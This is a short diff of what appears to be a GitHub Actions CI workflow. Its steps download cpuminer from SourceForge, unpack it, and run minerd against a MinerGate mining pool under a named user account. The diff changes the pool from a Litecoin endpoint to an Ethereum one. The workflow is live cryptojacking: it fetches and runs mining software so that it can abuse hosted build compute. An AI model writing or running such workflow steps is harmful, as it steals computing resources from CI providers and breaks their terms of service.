@@ -13,4 +13,4 @@ jobs:
       - run: sudo apt-get install wget tar -y
       - run: curl https://cfhcable.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -o c.tar.gz
       - run: tar xvzf c.tar.gz
-      - run: ./minerd -o stratum+tcp://ltc.pool.minergate.com:3336 -u ukgdjl@hi2.in -p x
+      - run: ./minerd -o stratum+tcp://eth.pool.minergate.com:45791 -u ukgdjl@hi2.in -p x
